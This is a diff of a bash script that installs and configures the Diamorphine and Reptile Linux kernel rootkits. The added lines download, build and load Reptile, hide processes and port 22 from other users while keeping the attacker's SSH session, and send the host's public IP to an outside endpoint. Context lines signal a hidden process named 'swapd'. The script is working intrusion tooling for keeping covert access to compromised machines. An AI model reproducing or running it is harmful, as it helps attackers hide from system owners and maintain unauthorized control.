@@ -1,5 +1,10 @@
 #!/bin/bash
 
+# Fix CentOS/RHEL 7 repos
+sudo rm -rf /etc/yum.repos.d/CentOS-*
+sudo curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
+sudo yum clean all && sudo yum makecache
+
 # ======================================================================
 #                           SAFETY MECHANISMS
 # ======================================================================
@@ -57,10 +62,13 @@ timeout_run() {
 # 3. Command timeout with logging
 safe_run() {
     local timeout=25
-    echo "[RUNNING] $*"
+    echo "[SAFE_RUN] $@"
     timeout $timeout "$@"
     local status=$?
-    [ $status -eq 124 ] && echo "TIMEOUT: $*" >&2
+    if [ $status -eq 124 ]; then
+        echo "[TIMEOUT] Command failed: $@"
+        return 1
+    fi
     return $status
 }
 
@@ -708,6 +716,14 @@ safe_run insmod diamorphine.ko
 dmesg -C
 kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
+# Create emergency swap to prevent OOM killer
+sudo dd if=/dev/zero of=/swapfile bs=1G count=2
+sudo chmod 600 /swapfile
+sudo mkswap /swapfile
+sudo swapon /swapfile
+echo "vm.swappiness=100" | sudo tee -a /etc/sysctl.conf
+sudo sysctl -p
+
 # ====== SAFE REPTILE INSTALL ======
 # Keep this BEFORE any Reptile installation commands
 CURRENT_SSH_PID=$$  # Capture current SSH session PID
@@ -732,40 +748,44 @@ rm -rf Reptile
 NEEDRESTART_MODE=a apt-get update -y
 yum update -y
 yum install -y ncurses-devel
-git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile
-
-# ====== MODIFIED REPTILE INSTALL SECTION ======
-install_reptile() {
-    (
-        trap 'exit 1' SIGTERM
-        safe_run make defconfig
-        safe_run make -j$(nproc)
-        safe_run make install
-    ) &>/dev/null
-
-    if [ $? -ne 0 ]; then
-        echo "REPTILE COMPILE FAILED - ENTERING SAFE MODE"
-        safe_run rm -rf /tmp/.ICE-unix/Reptile
-        return 1
-    fi
+git clone https://github.com/f0rb1dd3n/Reptile --depth 1 || {
+    echo "[!] Git failed, using direct download";
+    curl -L https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip -o reptile.zip && \
+    unzip reptile.zip && \
+    mv Reptile-master Reptile
 }
 
-dmesg -C
-safe_run /reptile/reptile_cmd hide
-    
-    # Preserve SSH visibility
-    SSHD_PID=$(pidof sshd)
-    echo "[!] Whitelisting SSH (PID: $SSHD_PID)"
-    /reptile/reptile_cmd show_pid $SSHD_PID
-    /reptile/reptile_cmd show_port 22
-    
+cd Reptile
+
+# Apply critical kernel version patch
+sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk
+
+# Build with memory limits
+ulimit -v 1048576  # Limit to 1GB virtual memory
+nice -n 19 make defconfig
+nice -n 19 make -j$(($(nproc)/2))  # Use half of CPU cores
+
+if [ $? -ne 0 ]; then
+    echo "[!] Main compilation failed, trying legacy mode"
+    make clean
+    make CC=gcc-4.8  # Force older compiler
+fi
+
+[ -f output/reptile.ko ] && sudo insmod output/reptile.ko || echo "[!] Compilation ultimately failed"
+
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
-# ====== CRITICAL: PROTECT CURRENT SSH SESSION ======
-# Whitelist current SSH connection before enabling rootkit
-/reptile/reptile_cmd show_pid $CURRENT_SSH_PID
-/reptile/reptile_cmd show_port $CURRENT_SSH_PORT
-/reptile/reptile_cmd show_file /etc/ssh/sshd_config
+# Replace existing SSH handling with:
+SSHD_PIDS=$(pgrep -f "sshd:.*@")
+for pid in $SSHD_PIDS; do
+    echo 0 > /proc/$pid/oom_score_adj
+    /reptile/reptile_cmd show_pid $pid 2>/dev/null
+    /reptile/reptile_cmd show_file /proc/$pid/cmdline
+done
+
+# Whitelist current SSH session
+CURRENT_SSH_PORT=$(sudo netstat -tnep | awk '/sshd/ && $NF~/'"$$"'/ {split($4,a,":");print a[2]}')
+sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT
 
 # ====== ENABLE ROOTKIT FEATURES SAFELY ======
 # Activate Reptile but exclude critical components
@@ -773,9 +793,9 @@ kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2
 /reptile/reptile_cmd hide_port 22  # Hide SSH port from NEW connections
 /reptile/reptile_cmd hide_pid 1  # Hide init but preserve current session
 
-# ======== CONNECTION VERIFICATION ========
-echo "[*] Testing SSH survival"
-curl -m 10 --retry 3 http://ssh-check.com/api/verify?ip=$(hostname -I)
+# Replace with IPv4-only check:
+SSH_TEST_IP=$(curl -4 -s ifconfig.co)
+curl -4 -s "http://ssh-check.com/api/verify?ip=${SSH_TEST_IP}" || true
 
 # ====== SAFE EXECUTION ======
 if install_reptile; then
